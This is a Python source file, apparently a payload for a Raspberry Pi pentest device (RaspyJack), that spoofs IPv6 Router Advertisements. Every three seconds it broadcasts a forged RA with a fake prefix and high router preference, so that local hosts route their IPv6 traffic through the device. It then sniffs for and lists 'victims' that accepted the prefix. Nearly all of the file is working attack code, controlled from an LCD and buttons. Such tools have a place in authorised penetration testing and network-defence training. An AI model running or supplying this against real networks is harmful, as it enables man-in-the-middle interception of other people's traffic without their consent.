#!/usr/bin/env python3
"""
RaspyJack Payload -- IPv6 Router Advertisement Spoofing
=======================================================
Author: 7h30th3r0n3

Sends rogue Router Advertisement packets on the local network to become
the default IPv6 gateway.  Victims that accept the RA will route their
IPv6 traffic through the Pi.

Controls:
  OK         -- Start / Stop attack
  UP / DOWN  -- Scroll victim list
  KEY1       -- Change fake prefix
  KEY3       -- Exit

Works on eth0 (no monitor mode needed).
"""

import os
import sys
import time
import socket
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr,
        ICMPv6ND_NS, Ether, sendp, sniff as scapy_sniff,
        get_if_hwaddr, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
ROW_H = 12

PREFIXES = [
    "2001:db8:1::",
    "2001:db8:2::",
    "fd00:dead:beef::",
    "fd00:cafe:babe::",
    "2001:db8:abcd::",
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
attacking = False
_running = True
prefix_idx = 0
victims = {}        # {ipv6_src: {"mac": str, "first_seen": float, "last_seen": float}}
ra_sent = 0
scroll = 0
status_msg = "Ready. OK to start."
iface = "eth0"


# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_interface():
    """Detect the best wired interface (prefer eth0)."""
    for candidate in ["eth0", "enp0s3", "ens33"]:
        try:
            r = subprocess.run(["ip", "link", "show", candidate],
                               capture_output=True, text=True, timeout=5)
            if "UP" in r.stdout:
                return candidate
        except Exception:
            pass
    # Fallback: first non-lo, non-wlan interface that is UP
    try:
        r = subprocess.run(["ip", "-o", "link", "show", "up"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split(":")
            if len(parts) >= 2:
                name = parts[1].strip()
                if name != "lo" and not name.startswith("wlan"):
                    return name
    except Exception:
        pass
    return "eth0"


def _get_mac(iface_name):
    """Get the MAC address of an interface."""
    try:
        return get_if_hwaddr(iface_name)
    except Exception:
        pass
    try:
        with open(f"/sys/class/net/{iface_name}/address") as f:
            return f.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _get_link_local(iface_name):
    """Get link-local IPv6 address for an interface."""
    try:
        r = subprocess.run(["ip", "-6", "addr", "show", iface_name, "scope", "link"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet6"):
                addr = line.split()[1].split("/")[0]
                return addr
    except Exception:
        pass
    return "fe80::1"


# ---------------------------------------------------------------------------
# RA sender thread
# ---------------------------------------------------------------------------

def _ra_sender_thread(iface_name, src_mac, src_ip, prefix):
    """Periodically send rogue RA packets."""
    global ra_sent, attacking, status_msg

    ra_pkt = (Ether(src=src_mac, dst="33:33:00:00:00:01")
              / IPv6(src=src_ip, dst="ff02::1")
              / ICMPv6ND_RA(routerlifetime=1800, reachabletime=0,
                            retranstimer=0, M=0, O=0, prf=1)
              / ICMPv6NDOptPrefixInfo(
                  prefix=prefix, prefixlen=64,
                  L=1, A=1,
                  validlifetime=2592000,
                  preferredlifetime=604800)
              / ICMPv6NDOptSrcLLAddr(lladdr=src_mac))

    while attacking and _running:
        try:
            sendp(ra_pkt, iface=iface_name, verbose=False)
            with lock:
                ra_sent += 1
                status_msg = f"RA sent: {ra_sent}"
        except Exception:
            pass
        # Send every 3 seconds
        deadline = time.time() + 3.0
        while time.time() < deadline and attacking and _running:
            time.sleep(0.2)


# ---------------------------------------------------------------------------
# Victim sniffer thread
# ---------------------------------------------------------------------------

def _victim_sniffer_thread(iface_name, prefix):
    """Sniff for hosts using the advertised prefix (accepted the RA)."""
    global status_msg

    prefix_upper = prefix.upper().rstrip(":")

    def _handle(pkt):
        if not _running or not attacking:
            return
        if pkt.haslayer(IPv6):
            src = pkt[IPv6].src
            if not src or src.startswith("ff") or src.startswith("::"):
                return
            # Check if source address matches our fake prefix
            src_upper = src.upper()
            if prefix_upper and src_upper.startswith(prefix_upper.rstrip(":")):
                src_mac = pkt[Ether].src if pkt.haslayer(Ether) else "unknown"
                now = time.time()
                with lock:
                    if src not in victims:
                        victims[src] = {
                            "mac": src_mac,
                            "first_seen": now,
                            "last_seen": now,
                        }
                    else:
                        victims[src] = {
                            **victims[src],
                            "last_seen": now,
                        }

    try:
        scapy_sniff(iface=iface_name, prn=_handle, store=False,
                    filter="ip6",
                    stop_filter=lambda _: not attacking or not _running)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "IPv6 RA SPOOF", font=font, fill="#AA00FF")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if attacking else "#444")

    with lock:
        msg = status_msg
        prefix = PREFIXES[prefix_idx]
        sent = ra_sent
        victim_list = list(victims.items())
        is_attacking = attacking

    d.text((2, 16), f"IF: {iface}", font=font, fill="#888")
    d.text((2, 26), f"Pfx: {prefix[:18]}", font=font, fill="#FFAA00")
    d.text((2, 36), f"Sent:{sent} Victims:{len(victim_list)}", font=font, fill="#AAAAAA")

    # Victim list
    visible = victim_list[scroll:scroll + ROWS_VISIBLE]
    for i, (v6addr, info) in enumerate(visible):
        y = 48 + i * ROW_H
        # Truncate IPv6 for display
        short = v6addr.split("::")[-1] if "::" in v6addr else v6addr[-12:]
        mac_short = info["mac"][-8:]
        d.text((2, y), f"{short[:10]} {mac_short}", font=font, fill="#CCCCCC")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if is_attacking:
        d.text((2, 117), "OK:Stop K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Start K1:Pfx K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, attacking, scroll, prefix_idx, status_msg, iface, ra_sent

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = _detect_interface()
    src_mac = _get_mac(iface)
    src_ip = _get_link_local(iface)
    status_msg = f"Ready on {iface}"

    ra_thread = None
    sniff_thread = None

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if not attacking:
                    attacking = True
                    ra_sent = 0
                    prefix = PREFIXES[prefix_idx]
                    ra_thread = threading.Thread(
                        target=_ra_sender_thread,
                        args=(iface, src_mac, src_ip, prefix),
                        daemon=True)
                    ra_thread.start()
                    sniff_thread = threading.Thread(
                        target=_victim_sniffer_thread,
                        args=(iface, prefix),
                        daemon=True)
                    sniff_thread.start()
                    status_msg = "Attack started"
                else:
                    attacking = False
                    status_msg = "Attack stopped"
                time.sleep(0.3)

            elif btn == "KEY1" and not attacking:
                prefix_idx = (prefix_idx + 1) % len(PREFIXES)
                status_msg = f"Prefix: {PREFIXES[prefix_idx][:18]}"
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    max_scroll = max(0, len(victims) - ROWS_VISIBLE)
                scroll = min(scroll + 1, max_scroll)
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        attacking = False
        time.sleep(0.5)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
